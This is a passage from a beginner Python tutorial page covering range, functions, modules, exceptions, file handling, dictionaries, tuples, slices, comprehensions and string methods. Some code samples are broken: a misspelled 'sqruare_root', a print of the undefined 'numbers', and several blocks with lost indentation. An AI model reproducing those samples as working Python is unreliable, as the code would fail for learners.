fixed. For example, iterating over a fixed list of items in a shopping
list.</p>
<p>The <strong>while</strong> loop is used in cases when the number of iterations is not
known and depends on some calculations and conditions in the code block
of the loop. For example, ending the loop when the user enters a
specific input in a calculator program.</p>
<blockquote>
<p>Both, <strong>for</strong> and <strong>while</strong> loops can be used to achieve the same
results, however, the <strong>for</strong> loop has cleaner and shorter syntax,
making it a better choice in most cases.</p>
</blockquote>
<hr />
<h2 id="range"><a class="header" href="#range">Range</a></h2>
<p>The <strong>range()</strong> function returns a sequence of numbers. By default, it
starts from 0, increments by 1 and stops <strong>before the specified
number</strong>.</p>
<p>The code below generates a list containing all of the integers, up to
10.</p>
<pre><code class="language-py">nums = list(range(10))
print(nums)
</code></pre>
<blockquote>
<p>In order to output the range as a list, we need to explicitly convert
it to a list, using the <strong>list()</strong> function.</p>
</blockquote>
<p>If <strong>range</strong> is called with one argument, it produces an object with
values from 0 to that argument. If it is called with two arguments, it
produces values from the first to the second. <strong>For example:</strong></p>
<pre><code class="language-py">nums = list(range(3,10))
print(numbers)

print(range(20) == range(0,20))
</code></pre>
<blockquote>
<p>Remember, the second argument is not included in the range, so
<strong>range(3, 8)</strong> will not include the number 8.</p>
</blockquote>
<p><strong>range</strong> can have a third argument, which determines the interval of
the sequence produced, also called the <strong>step</strong>.</p>
<pre><code class="language-py">numbers = list(range(5,20,2))
print(numbers)
</code></pre>
<blockquote>
<p>We can also create list of decreasing numbers, using a negative number
as the third argument, for example <strong>list(range(20, 5, -2))</strong>.</p>
</blockquote>
<hr />
<h3 id="for-loops-1"><a class="header" href="#for-loops-1">for Loops</a></h3>
<p>The <strong>for</strong> loop is commonly used to repeat some code a certain number
of times. This is done by combining for loops with <strong>range</strong> objects.</p>
<pre><code class="language-py">for i in range(5):
    print("hello world!")
</code></pre>
<blockquote>
<p>You don’t need to call <strong>list</strong> on the <strong>range</strong> object when it is
used in a <strong>for</strong> loop, because it isn’t being indexed, so a list
isn’t required.</p>
</blockquote>
<hr />
<h2 id="reusing-code"><a class="header" href="#reusing-code">Reusing Code</a></h2>
<p><strong>Code reuse</strong> is a very important part of programming in any language.
Increasing code size makes it harder to maintain. For a large
programming project to be successful, it is essential to abide by the
<strong>Don’t Repeat Yourself</strong>, or <strong>DRY</strong>, principle. We’ve already looked
at one way of doing this: by using loops. In this module, we will
explore two more: functions and modules. &gt;Bad, repetitive code is said
to abide by the <strong>WET</strong> principle, which stands for <strong>Write Everything
Twice</strong>, or <strong>We Enjoy Typing</strong>.</p>
<hr />
<h2 id="functions-2"><a class="header" href="#functions-2">Functions</a></h2>
<p>You’ve already used <strong>functions</strong> previously. Any statement that
consists of a word followed by information in <strong>parentheses</strong> is a
function call. Here are some examples that you’ve already seen:</p>
<pre><code class="language-py">print("Hello world")
range(2,20)
str(12)
range(10,20,3)
</code></pre>
<blockquote>
<p>The words in front of the parentheses are function <strong>names</strong>, and the
comma-separated values inside the parentheses are function
<strong>arguments</strong>.</p>
</blockquote>
<p>In addition to using pre-defined functions, you can create your own
functions by using the <strong>def</strong> statement. Here is an example of a
function named <code>my_func</code>. It takes no arguments, and prints “spam”
three times. It is defined, and then called. The statements in the
function are executed only when the function is called.</p>
<pre><code class="language-py">def my_func():
    print("spam")
    print("spam")
    print("spam")
my_func()
</code></pre>
<blockquote>
<p>The code block within every function starts with a colon (:) and is
<strong>indented</strong>.</p>
</blockquote>
<p>You must define functions before they are called, in the same way that
you must assign variables before using them.</p>
<pre><code class="language-py">hello()

def hello():
    print('Hello world')
</code></pre>
<hr />
<h3 id="arguments"><a class="header" href="#arguments">Arguments</a></h3>
<p>All the function definitions we’ve looked at so far have been functions
of zero arguments, which are called with empty parentheses. However,
most functions take arguments. The example below defines a function that
takes one argument:</p>
<pre><code class="language-py">def print_with_exclamation(word):
    print(word + "!")
print_with_exclamation("spam")
print_with_exclamation("eggs")
print_with_exclamation("python")
</code></pre>
<blockquote>
<p>As you can see, the argument is defined inside the parentheses.</p>
</blockquote>
<p>You can also define functions with more than one argument; separate them
with commas.</p>
<pre><code class="language-py">def print_sum_twice(x, y):
    print(x+y)
    print(x+y)

print_sum_twice(5, 20)
</code></pre>
<p>Function arguments can be used as variables inside the function
definition. However, they cannot be referenced outside of the function’s
definition. This also applies to other variables created inside a
function.</p>
<pre><code class="language-py">def function(variable):
    variable += 1
    print(variable)
function(7)
print(variable)
</code></pre>
<p>This code will throw an <strong>error</strong> because the variable is defined inside
the function and can be referenced only there. &gt;Technically,
<strong>parameters</strong> are the variables in a function definition, and
<strong>arguments</strong> are the values put into parameters when functions are
called.</p>
<hr />
<h3 id="returning-from-functions"><a class="header" href="#returning-from-functions">Returning from Functions</a></h3>
<p>Certain functions, such as <code>int</code> or <code>str</code> return a value that can
be used later. To do this for your defined functions, you can use the
<strong>return</strong> statement.</p>
<p><strong>For example:</strong></p>
<pre><code class="language-py">def  max(x, y):
    if x &gt;=y:
        return x
    else:
        return y
print(max(4,  7))
z = max(8,  5)
print(z)
</code></pre>
<blockquote>
<p>The <strong>return</strong> statement cannot be used outside of a function
definition.</p>
</blockquote>
<p>Once you return a value from a function, it immediately stops being
executed. Any code after the <strong>return</strong> statement will never happen.
<strong>For example:</strong></p>
<pre><code class="language-py">def add_numbers(x, y):
    total = x + y
    return total
    print("This won't be printed")
print(add_numbers(4,  5))
</code></pre>
<hr />
<h2 id="comments"><a class="header" href="#comments">Comments</a></h2>
<p><strong>Comments</strong> are annotations to code used to make it easier to
understand. They don’t affect how code is run. In Python, a comment is
created by inserting an <strong>octothorpe</strong> (otherwise known as a number sign
or hash symbol: #). All text after it on that line is ignored. <strong>For
example:</strong></p>
<pre><code class="language-py">x = 365
y = 7
# this is a comment
print(x % y)  # find the remainder
# print (x // y)
# another comment
</code></pre>
<blockquote>
<p>Python doesn’t have general purpose multiline comments, as do
programming languages such as C.</p>
</blockquote>
<hr />
<h3 id="docstrings"><a class="header" href="#docstrings">Docstrings</a></h3>
<p><strong>Docstrings</strong> (documentation strings) serve a similar purpose to
comments, as they are designed to explain code. However, they are more
specific and have a different syntax. They are created by putting a
multiline string containing an explanation of the function below the
<strong>function’s first line</strong>.</p>
<pre><code class="language-py">def shout(word):
"""
Print a word with an
exclamation mark following it.
"""
print(word + "!")
shout("spam")
</code></pre>
<blockquote>
<p>Unlike conventional comments, <strong>docstrings</strong> are retained throughout
the runtime of the program. This allows the programmer to inspect
these comments at run time.</p>
</blockquote>
<hr />
<p>Although they are created differently from normal variables,
<strong>functions</strong> are just like any other kind of value. They can be
assigned and reassigned to variables, and later referenced by those
names.</p>
<pre><code class="language-py">def multiply(x, y):
    return x * y
a = 4
b = 7
operation = multiply
print(operation(a, b))
</code></pre>
<blockquote>
<p>The example above assigned the function <strong>multiply</strong> to a variable
<strong>operation</strong>. Now, the name <strong>operation</strong> can also be used to call
the function.</p>
</blockquote>
<p>Functions can also be used as <strong>arguments</strong> of other functions.</p>
<pre><code class="language-py">def add(x, y):
    return x + y
def do_twice(func, x, y):
return func(func(x, y), func(x, y))
a = 5
b = 10
print(do_twice(add, a, b))
</code></pre>
<hr />
<h2 id="modules"><a class="header" href="#modules">Modules</a></h2>
<p><strong>Modules</strong> are pieces of code that other people have written to fulfill
common tasks, such as generating random numbers, performing mathematical
operations, etc.</p>
<p>The basic way to use a module is to add <strong>import module_name</strong> at the
top of your code, and then using <strong>module_name.var</strong> to access functions
and values with the name <strong>var</strong> in the module. For example, the
following example uses the <strong>random</strong> module to generate random numbers:</p>
<pre><code class="language-py">import random
for i in  range(5):
    value = random.randint(1,  6)
    print(value)
</code></pre>
<blockquote>
<p>The code uses the <strong>randint</strong> function defined in the <strong>random</strong>
module to print 5 random numbers in the range 1 to 6.</p>
</blockquote>
<p>There is another kind of <strong>import</strong> that can be used if you only need
certain functions from a module. These take the form <strong>from module_name
import var</strong>, and then <strong>var</strong> can be used as if it were defined
normally in your code. For example, to import only the <strong>pi</strong> constant
from the <strong>math</strong> module:</p>
<pre><code class="language-py">from math import pi
    print(pi)
</code></pre>
<p>Use a comma separated list to import multiple objects. For example:</p>
<p>from math import pi, sqrt</p>
<blockquote>
<p>* imports all objects from a module. For example: <strong>from math
import</strong> *. This is generally discouraged, as it confuses variables
in your code with variables in the external module.</p>
</blockquote>
<p>Trying to import a module that isn’t available causes an ImportError.</p>
<pre><code class="language-py">import some_module
</code></pre>
<p>You can import a module or object under a different name using the
<strong>as</strong> keyword. This is mainly used when a module or object has a long
or confusing name. <strong>For example:</strong></p>
<pre><code class="language-py">from math import sqrt as square_root
print(sqruare_root(100))
</code></pre>
<hr />
<h3 id="the-standard-library"><a class="header" href="#the-standard-library">The standard library</a></h3>
<p>There are three main types of modules in Python, those you write
yourself, those you install from external sources, and those that are
pre-installed with Python. The last type is called the <strong>standard
library</strong>, and contains many useful modules. Some of the standard
library’s useful modules include <code>string</code>, <code>re</code>, <code>datetime</code>, <code>math</code>, <code>random</code>, <code>os</code>, <code>multiprocessing</code>, <code>subprocess</code>, <code>socket</code>, <code>email</code>, <code>json</code>, <code>doctest</code>, <code>unittest</code>, <code>pdb</code>, <code>argparse</code> and <code>sys</code>.</p>
<p>Tasks that can be done by the standard library include string parsing,
data serialization, testing, debugging and manipulating dates, emails,
command line arguments, and much more!</p>
<blockquote>
<p>Python’s extensive standard library is one of its main strengths as a
language.</p>
</blockquote>
<p>Some of the modules in the standard library are written in Python, and
some are written in C. Most are available on all platforms, but some are
Windows or Unix specific.</p>
<blockquote>
<p>We won’t cover all of the modules in the standard library; there are
simply too many. The complete documentation for the standard library
is available online at www.python.org.</p>
</blockquote>
<p>Many third-party Python modules are stored on the <strong>Python Package Index
(PyPI)</strong>. The best way to install these is using a program called
<strong>pip</strong>. This comes installed by default with modern distributions of
Python. If you don’t have it, it is easy to install online. Once you
have it, installing libraries from PyPI is easy. Look up the name of the
library you want to install, go to the command line (for Windows it will
be the Command Prompt), and enter <strong>pip install library_name</strong>. Once
you’ve done this, import the library and use it in your code.</p>
<p>Using <strong>pip</strong> is the standard way of installing libraries on most
operating systems, but some libraries have prebuilt binaries for
Windows. These are normal executable files that let you install
libraries with a GUI the same way you would install other programs.</p>
<blockquote>
<p>It’s important to enter <strong>pip</strong> commands at the command line, not the
Python interpreter.</p>
</blockquote>
<hr />
<h2 id="exceptions"><a class="header" href="#exceptions">Exceptions</a></h2>
<p>You have already seen <strong>exceptions</strong> in previous code. They occur when
something goes wrong, due to incorrect code or input. When an exception
occurs, the program immediately stops. The following code produces the
<code>ZeroDivisionError</code> exception by trying to divide 7 by 0.</p>
<pre><code class="language-py">print(7//0)
</code></pre>
<p>Different exceptions are raised for different reasons. Common
exceptions: <code>ImportError</code>: an import fails; <code>IndexError</code>: a list is
indexed with an out-of-range number; <code>NameError</code>: an unknown variable
is used; <code>SyntaxError</code>: the code can’t be parsed properly;
<code>TypeError</code>: a function is called on a value of an inappropriate type;
<code>ValueError</code>: a function is called on a value of the correct type, but
with an inappropriate value.</p>
<blockquote>
<p>Python has several other built-in exceptions, such as
<code>ZeroDivisionError</code> and <code>OSError</code>. Third-party libraries also often define
their own exceptions.</p>
</blockquote>
<hr />
<h3 id="exception-handling"><a class="header" href="#exception-handling">Exception Handling</a></h3>
<p>To handle exceptions, and to call code when an exception occurs, you can
use a <strong>try/except</strong> statement. The <strong>try</strong> block contains code that
might throw an exception. If that exception occurs, the code in the
<strong>try</strong> block stops being executed, and the code in the <strong>except</strong> block
is run. If no error occurs, the code in the <strong>except</strong> block doesn’t
run. <strong>For example:</strong></p>
<pre><code class="language-py">try:
    num1 = 7
    num2 = 0
    print  (num1 / num2)
    print("Done calculation")
except ZeroDivisionError:
    print("An error occurred")
    print("due to zero division")
</code></pre>
<blockquote>
<p>In the code above, the except statement defines the type of exception
to handle (in our case, the <code>ZeroDivisionError</code>.</p>
</blockquote>
<p>A <strong>try</strong> statement can have multiple different <strong>except</strong> blocks to
handle different exceptions. Multiple exceptions can also be put into a
single <strong>except</strong> block using parentheses, to have the <strong>except</strong> block
handle all of them.</p>
<pre><code class="language-py">try:
    variable = 10
    print(variable + "hello")
    print(variable / 2)
except ZeroDivisionError:
    print("Divided by zero")
except  (ValueError, TypeError):
    print("Error occurred")
</code></pre>
<p>An <strong>except</strong> statement without any exception specified will catch all
errors. These should be used sparingly, as they can catch unexpected
errors and hide programming mistakes. <strong>For example:</strong></p>
<pre><code class="language-py">try:
    word ="spam"
    print(word/0)
except:
    print("An error occured")
</code></pre>
<blockquote>
<p>Exception handling is particularly useful when dealing with user
input.</p>
</blockquote>
<p>To ensure some code runs no matter what errors occur, you can use a
<strong>finally</strong> statement. The <strong>finally</strong> statement is placed at the bottom
of a <strong>try/except</strong> statement. Code within a <strong>finally</strong> statement
always runs after execution of the code in the <strong>try</strong>, and possibly in
the <strong>except</strong>, blocks.</p>
<pre><code class="language-py">try:
    print("Hello")
    print(1 / 0)
except ZeroDivisionError:
    print("Divided by zero")
finally:
    print("This code will run no matter what")
</code></pre>
<blockquote>
<p>Run the code and see how it works!</p>
</blockquote>
<p>Code in a <strong>finally</strong> statement even runs if an uncaught exception
occurs in one of the preceding blocks.</p>
<pre><code class="language-py">try:
    print(1)
    print(10 / 0)
except ZeroDivisionError:
    print(unknown_var)
finally:
    print("This is executed last")
</code></pre>
<hr />
<h3 id="raising-exceptions"><a class="header" href="#raising-exceptions">Raising exceptions</a></h3>
<p>You can raise exceptions by using the <strong>raise</strong> statement.</p>
<pre><code class="language-py">print(1)
raise ValueError
print(2)
</code></pre>
<blockquote>
<p>You need to specify the <strong>type</strong> of the exception raised.</p>
</blockquote>
<p>Exceptions can be raised with arguments that give detail about them.
<strong>For example:</strong></p>
<pre><code class="language-py">name = "123"
raise NameError("Invalid Name: ")
</code></pre>
<p>In <strong>except</strong> blocks, the <strong>raise</strong> statement can be used without
arguments to re-raise whatever exception occurred. <strong>For example:</strong></p>
<pre><code class="language-py">try:
    num = 5 / 0
except:
    print("An error occurred")
    raise
</code></pre>
<hr />
<h2 id="assertions"><a class="header" href="#assertions">Assertions</a></h2>
<p>An <strong>assertion</strong> is a sanity-check that you can turn on or turn off when
you have finished testing the program. An expression is tested, and if
the result comes up false, an exception is raised. Assertions are
carried out through use of the <strong>assert</strong> statement.</p>
<pre><code class="language-py">print(1)
assert  2 + 2 == 4
print(2)
assert  1 + 1 == 3
print(3)
</code></pre>
<blockquote>
<p>Programmers often place assertions at the start of a function to check
for valid input, and after a function call to check for valid output.</p>
</blockquote>
<p>The <strong>assert</strong> can take a second argument that is passed to the
<code>AssertionError</code> raised if the assertion fails.</p>
<pre><code class="language-py">temp = -10
assert (temp &gt;=0), "Colder than absolute zero!"
</code></pre>
<blockquote>
<p>AssertionError exceptions can be caught and handled like any other
exception using the <strong>try-except</strong> statement, but if not handled, this
type of exception will terminate the program.</p>
</blockquote>
<hr />
<h2 id="files"><a class="header" href="#files">Files</a></h2>
<p>You can use Python to read and write the contents of <strong>files</strong>. Text
files are the easiest to manipulate. Before a file can be edited, it
must be opened, using the <strong>open</strong> function.</p>
<pre><code class="language-py">myfile = open("filename.txt")
</code></pre>
<blockquote>
<p>The argument of the <strong>open</strong> function is the <strong>path</strong> to the file. If
the file is in the current working directory of the program, you can
specify only its name.</p>
</blockquote>
<p>You can specify the <strong>mode</strong> used to open a file by applying a second
argument to the <strong>open</strong> function. Sending “r” means open in read mode,
which is the default. Sending “w” means write mode, for rewriting the
contents of a file. Sending “a” means append mode, for adding new
content to the end of the file.</p>
<p>Adding “b” to a mode opens it in <strong>binary</strong> mode, which is used for
non-text files (such as image and sound files). <strong>For example:</strong></p>
<pre><code class="language-py"># write mode
open("filename.txt", "w")

# read mode
open("filename.txt", "r")
open("filename.txt")

# binary write mode
open("filename.txt", "wb")
</code></pre>
<blockquote>
<p>You can use the + sign with each of the modes above to give them extra
access to files. For example, r+ opens the file for both reading and
writing.</p>
</blockquote>
<p>Once a file has been opened and used, you should close it. This is done
with the <strong>close</strong> method of the file object.</p>
<pre><code class="language-py">file = open("filename.txt", "w")
# do stuff to the file
file.close()
</code></pre>
<hr />
<p>The contents of a file that has been opened in text mode can be read
using the <strong>read</strong> method.</p>
<pre><code class="language-py">file = open("filename.txt", "r")
cont = file.read()
print(cont)
file.close()
</code></pre>
<blockquote>
<p>This will print all of the contents of the file “filename.txt”.</p>
</blockquote>
<p>To read only a certain amount of a file, you can provide a number as an
argument to the <strong>read</strong> function. This determines the number of
<strong>bytes</strong> that should be read. You can make more calls to <strong>read</strong> on
the same file object to read more of the file byte by byte. With no
argument, <strong>read</strong> returns the rest of the file.</p>
<pre><code class="language-py">file = open("filename.txt", "r")
print(file.read(16))
print(file.read(4))
print(file.read(4))
print(file.read())
file.close()
</code></pre>
<blockquote>
<p>Just like passing no arguments, negative values will return the entire
contents.</p>
</blockquote>
<p>After all contents in a file have been read, any attempts to read
further from that file will return an empty string, because you are
trying to read from the end of the file.</p>
<pre><code class="language-py">file = open("filename.txt", "r")
file.read()
print("Re-reading")
print(file.read())
print("Finished")
file.close()
</code></pre>
<p><strong>Result:</strong></p>
<pre><code class="language-py">&gt;&gt;&gt;
Re-reading

Finished
&gt;&gt;&gt;
</code></pre>
<p>To retrieve each line in a file, you can use the <strong>readlines</strong> method to
return a list in which each element is a line in the file. <strong>For
example:</strong></p>
<p>file = open(“filename.txt”, “r”) print(file.readlines()) file.close()</p>
<p><strong>Result:</strong></p>
<pre><code class="language-py">&gt;&gt;&gt;
['Line 1 text \n', 'Line 2 text \n', 'Line 3 text']
&gt;&gt;&gt;
</code></pre>
<p>You can also use a <strong>for</strong> loop to iterate through the lines in the
file:</p>
<pre><code class="language-py">file = open("filename.txt", "r")

for line in file:
print(line)

file.close()
</code></pre>
<p><strong>Result:</strong></p>
<pre><code class="language-py">&gt;&gt;&gt;
Line 1 text

Line 2 text

Line 3 text
&gt;&gt;&gt;
</code></pre>
<blockquote>
<p>In the output, the lines are separated by blank lines, as the
<strong>print</strong> function automatically adds a new line at the end of its
output.</p>
</blockquote>
<hr />
<p>To write to files you use the <strong>write</strong> method, which writes a string to
the file. <strong>For example:</strong></p>
<pre><code class="language-py">file = open("newfile.txt",  "w")
file.write("This has been written to a file")
file.close()
file = open("newfile.txt",  "r")
print(file.read())
file.close()
</code></pre>
<blockquote>
<p>The “w” mode will create a file, if it does not already exist.</p>
</blockquote>
<p>When a file is opened in write mode, the file’s existing content is
deleted.</p>
<pre><code class="language-py">file = open("newfile.txt",  "w")
file.write("Some new text")
file.close()
file = open("newfile.txt",  "r")
print("Reading new contents")
print(file.read())
print("Finished")
file.close()
</code></pre>
<blockquote>
<p>As you can see, the content of the file has been overwritten.</p>
</blockquote>
<p>The <strong>write</strong> method returns the number of <strong>bytes</strong> written to a file,
if successful.</p>
<pre><code class="language-py">msg = "Hello world!"
file = open("newfile.txt",  "w")
amount_written = file.write(msg)
print(amount_written)
file.close()
</code></pre>
<blockquote>
<p>To write something other than a string, it needs to be converted to a
string first.</p>
</blockquote>
<hr />
<p>It is good practice to avoid wasting resources by making sure that files
are always closed after they have been used. One way of doing this is to
use <strong>try</strong> and <strong>finally</strong></p>
<pre><code class="language-py">try:
    f = open("filename.txt")
    print(f.read())
finally:
    f.close()
</code></pre>
<blockquote>
<p>This ensures that the file is always closed, even if an error occurs.</p>
</blockquote>
<p>An alternative way of doing this is using <strong>with</strong> statements. This
creates a temporary variable (often called <strong>f</strong>), which is only
accessible in the indented block of the <strong>with</strong> statement.</p>
<pre><code class="language-py">with open("filename.txt")  as f:
print(f.read())
</code></pre>
<blockquote>
<p>The file is automatically closed at the end of the <strong>with</strong> statement,
even if exceptions occur within it.</p>
</blockquote>
<hr />
<h2 id="dictionaries"><a class="header" href="#dictionaries">Dictionaries</a></h2>
<p><strong>Dictionaries</strong> are data structures used to map arbitrary keys to
values. Lists can be thought of as dictionaries with integer keys within
a certain range. Dictionaries can be indexed in the same way as lists,
using <strong>square brackets</strong> containing keys. <strong>Example:</strong></p>
<pre><code class="language-py">ages = {"Dave":  24,  "Mary":  42,  "John":  58}
print(ages["Dave"])
print(ages["Mary"])
</code></pre>
<blockquote>
<p>Each element in a dictionary is represented by a <strong>key:value</strong> pair.</p>
</blockquote>
<p>Trying to index a key that isn’t part of the dictionary returns a
<strong>KeyError</strong>. <strong>Example:</strong></p>
<pre><code class="language-py">primary = {
"red":  [255,  0,  0],
"green":  [0,  255,  0],
"blue":  [0,  0,  255],
}
print(primary["red"])
print(primary["yellow"])
</code></pre>
<p>As you can see, a dictionary can store any types of data as values. &gt;An
empty dictionary is defined as <strong>{}</strong>.</p>
<p>Only <strong>immutable</strong> objects can be used as keys to dictionaries.
<strong>Immutable</strong> objects are those that can’t be changed. So far, the only
mutable objects you’ve come across are <strong>lists</strong> and <strong>dictionaries</strong>.
Trying to use a mutable object as a dictionary key causes a
<strong>TypeError</strong>.</p>
<pre><code class="language-py">bad_dict = {

[1,  2,  3]:  "one two three",

}
</code></pre>
<blockquote>
<p>Run the code and see how it works!</p>
</blockquote>
<p>Just like lists, dictionary keys can be assigned to different values.
However, unlike lists, a new dictionary key can also be assigned a
value, not just ones that already exist.</p>
<pre><code class="language-py">squares = {1:  1,  2:  4,  3:  "error",  4:  16,}
squares[8] = 64
squares[3] = 9
print(squares)
</code></pre>
<p>To determine whether a key is in a dictionary, you can use <strong>in</strong> and
<strong>not in</strong>, just as you can for a list. <strong>Example:</strong></p>
<pre><code class="language-py">nums = {
1:  "one",
2:  "two",
3:  "three",
}
print(1  in nums)
print("three"  in nums)
print(4  not  in nums)
</code></pre>
<p>A useful dictionary method is <strong>get</strong>. It does the same thing as
indexing, but if the key is not found in the dictionary it returns
another specified value instead (‘None’, by default). <strong>Example:</strong></p>
<pre><code class="language-py">pairs = {1:  "apple",
"orange":  [2,  3,  4],
True:  False,
None:  "True",
}

print(pairs.get("orange"))
print(pairs.get(7))
print(pairs.get(12345,  "not in dictionary"))
</code></pre>
<hr />
<h2 id="tuples"><a class="header" href="#tuples">Tuples</a></h2>
<p><strong>Tuples</strong> are very similar to lists, except that they are immutable
(they cannot be changed). Also, they are created using <strong>parentheses</strong>,
rather than square brackets. <strong>Example:</strong></p>
<pre><code class="language-py">words = ("spam", "eggs", "sausages",)
</code></pre>
<p>You can access the values in the tuple with their index, just as you did
with lists:</p>
<pre><code class="language-py">print(words[0])
</code></pre>
<p>Trying to reassign a value causes a TypeError.</p>
<pre><code class="language-py">words[1] = "cheese"
</code></pre>
<blockquote>
<p>You can access the values in the tuple with their index, just as you
did with lists.</p>
</blockquote>
<p>Tuples can be created without the parentheses, by just separating the
values with commas. <strong>Example:</strong></p>
<pre><code class="language-py">my_tuple = "one", "two", "three"
print(my_tuple[0])
</code></pre>
<p>An empty tuple is created using an empty parenthesis pair.</p>
<pre><code class="language-py">tpl = ()
</code></pre>
<blockquote>
<p>Tuples are faster than lists, but they cannot be changed.</p>
</blockquote>
<hr />
<h2 id="list-slices"><a class="header" href="#list-slices">List Slices</a></h2>
<p><strong>List slices</strong> provide a more advanced way of retrieving values from a
list. Basic list slicing involves indexing a list with <strong>two
colon-separated integers</strong>. This returns a new list containing all the
values in the old list between the indices. <strong>Example:</strong></p>
<pre><code class="language-py">squares = [0,  1,  4,  9,  16,  25,  36,  49,  64,  81]
print(squares[2:6])
print(squares[3:8])
print(squares[0:1])
</code></pre>
<blockquote>
<p>Like the arguments to <strong>range</strong>, the first index provided in a slice
is included in the result, but the second isn’t.</p>
</blockquote>
<p>If the first number in a slice is omitted, it is taken to be the start
of the list. If the second number is omitted, it is taken to be the end.
<strong>Example:</strong></p>
<pre><code class="language-py">squares = [0,  1,  4,  9,  16,  25,  36,  49,  64,  81]
print(squares[:7])
print(squares[7:])
</code></pre>
<blockquote>
<p>Slicing can also be done on tuples.</p>
</blockquote>
<p>List slices can also have a third number, representing the step, to
include only alternate values in the slice.</p>
<pre><code class="language-py">squares = [0,  1,  4,  9,  16,  25,  36,  49,  64,  81]
print(squares[::2])
print(squares[2:8:3])
</code></pre>
<blockquote>
<p>[2:8:3] will include elements starting from the 2nd index up to the
8th with a step of 3.</p>
</blockquote>
<p><strong>Negative</strong> values can be used in list slicing (and normal list
indexing). When negative values are used for the first and second values
in a slice (or a normal index), they count from the end of the list.</p>
<pre><code class="language-py">squares = [0,  1,  4,  9,  16,  25,  36,  49,  64,  81]
print(squares[1::-1])
</code></pre>
<blockquote>
<p>If a negative value is used for the step, the slice is done backwards.
Using <strong>[::-1]</strong> as a slice is a common and idiomatic way to reverse
a list.</p>
</blockquote>
<hr />
<h2 id="list-comprehensions"><a class="header" href="#list-comprehensions">List Comprehensions</a></h2>
<p><strong>List comprehensions</strong> are a useful way of quickly creating lists whose
contents obey a simple rule. For example, we can do the following:</p>
<pre><code class="language-py"># a list comprehension
cubes = [i**3  for i in  range(5)]
print(cubes)
</code></pre>
<blockquote>
<p>List comprehensions are inspired by set-builder notation in
mathematics.</p>
</blockquote>
<p>A list comprehension can also contain an <strong>if</strong> statement to enforce a
condition on values in the list. <strong>Example:</strong></p>
<pre><code class="language-py">evens=[i**2  for i in  range(10)  if i**2 % 2 == 0]
print(evens)
</code></pre>
<p>Trying to create a list in a very extensive range will result in a
<strong>MemoryError</strong>. This code shows an example where the list comprehension
runs out of memory.</p>
<pre><code class="language-py">even = [2*i for i in  range(10**100)]
</code></pre>
<blockquote>
<p>This issue is solved by <strong>generators</strong>, which are covered later.</p>
</blockquote>
<hr />
<h2 id="string-formatting"><a class="header" href="#string-formatting">String Formatting</a></h2>
<p>So far, to combine strings and non-strings, you’ve converted the
non-strings to strings and added them. String formatting provides a more
powerful way to embed non-strings within strings. String formatting uses
a string’s <strong>format</strong> method to substitute a number of arguments in the
string. <strong>Example:</strong></p>
<pre><code class="language-py"># string formatting
nums = [4,  5,  6]
msg = "Numbers: {0} {1} {2}". format(nums[0], nums[1], nums[2])
print(msg)
</code></pre>
<blockquote>
<p>Each argument of the format function is placed in the string at the
corresponding position, which is determined using the curly braces {
}.</p>
</blockquote>
<p>String formatting can also be done with named arguments. <strong>Example:</strong></p>
<pre><code class="language-py">a= "{x}, {y}".format(x = 5, y = 12)
print(a)
</code></pre>
<hr />
<h2 id="string-functions"><a class="header" href="#string-functions">String Functions</a></h2>
<p>Python contains many useful built-in functions and methods to accomplish
common tasks. <strong>join</strong> - joins a list of strings with another string as
a separator. <strong>replace</strong> - replaces one substring in a string with
another. <strong>startswith</strong> and <strong>endswith -</strong> determine if there is a
substring at the start and end of a string, respectively. To change the
case of a string, you can use <strong>lower</strong> and <strong>upper</strong>. The method
<strong>split</strong> is the opposite of <strong>join</strong> turning a string with a certain
separator into a list. <strong>Some examples:</strong></p>
<pre><code class="language-py">print(", ".join(["spam",  "eggs",  "ham"]))
#prints "spam, eggs, ham"

print("Hello ME".replace("ME",  "world"))
#prints "Hello world"

print("This is a sentence.".startswith("This"))
# prints "True"

print("This is a sentence.".endswith("sentence."))
# prints "True"

print("This is a sentence.".upper())
# prints "THIS IS A SENTENCE."

print("AN ALL CAPS SENTENCE".lower())
#prints "an all caps sentence"

print("spam, eggs, ham".split(", "))
#prints "['spam', 'eggs', 'ham']"
</code></pre>
<hr />
<h2 id="numeric-functions"><a class="header" href="#numeric-functions">Numeric Functions</a></h2>
<p>To find the maximum or minimum of some numbers or a list, you can use
<strong>max</strong> or <strong>min</strong>. To find the distance of a number from zero (its
absolute value), use <strong>abs</strong>. To round a number to a certain number of
decimal places, use <strong>round</strong>. To find the total of a list, use <strong>sum</strong>.
<strong>Some examples:</strong></p>
<pre><code class="language-py">print(min(1,  2,  3,  4,  0,  2,  1))
print(max([1,  4,  9,  2,  5,  6,  8]))
print(abs(-99))
print(abs(42))
print(sum([1,  2,  3,  4,  5]))
</code></pre>
<hr />
<h2 id="list-functions-1"><a class="header" href="#list-functions-1">List Functions</a></h2>
<p>Often used in conditional statements, <strong>all</strong> and <strong>any</strong> take a list as
an argument, and return <strong>True</strong> if all or any (respectively) of their
arguments evaluate to <strong>True</strong> (and <strong>False</strong> otherwise). The function
<strong>enumerate</strong> can be used to iterate through the values and indices of a
list simultaneously. <strong>Example:</strong></p>
<pre><code class="language-py">nums = [55,  44,  33,  22,  11]
if  all([i &gt; 5  for i in nums]):
    print("All larger than 5")

if  any([i % 2 == 0  for i in nums]):
    print("At least one is even")

for v in  enumerate(nums):
    print(v)
</code></pre>
<hr />
<h2 id="functional-programming"><a class="header" href="#functional-programming">Functional Programming</a></h2>
<p><strong>Functional programming</strong> is a style of programming that (as the name
suggests) is based around functions. A key part of functional
programming is <strong>higher-order functions</strong>. We have seen this idea
briefly in the previous lesson on functions as objects. Higher-order
functions take other functions as arguments, or return them as results.
<strong>Example:</strong></p>
<pre><code class="language-py">def apply_twice(func, arg):
    return func(func(arg))

def add_five(x):
    return x + 5

print(apply_twice(add_five,  10))
</code></pre>
<blockquote>
<p>The function <strong>apply_twice</strong> takes another function as its argument,
and calls it twice inside its body.</p>
</blockquote>
<hr />
<h3 id="pure-functions"><a class="header" href="#pure-functions">Pure Functions</a></h3>
<p>Functional programming seeks to use <strong>pure functions</strong>. Pure functions
have no side effects, and return a value that depends <strong>only</strong> on their
arguments. This is how functions in math work: for example, The cos(x)
will, for the same value of x, always return the same result. Below are
examples of pure and impure functions. <strong>Pure function:</strong></p>
<pre><code class="language-py">def pure_function(x, y):
    temp = x + 2*y
    return temp / (2*x + y)
</code></pre>
<p><strong>Impure function:</strong></p>
<pre><code class="language-py">some_list = []
def impure(arg):
    some_list.append(arg)
</code></pre>
<blockquote>
<p>The function above is not pure, because it changed the state of
<strong>some_list</strong>.</p>
</blockquote>
<p>Using pure functions has both advantages and disadvantages. Pure
functions are: - easier to reason about and test. - more efficient. Once
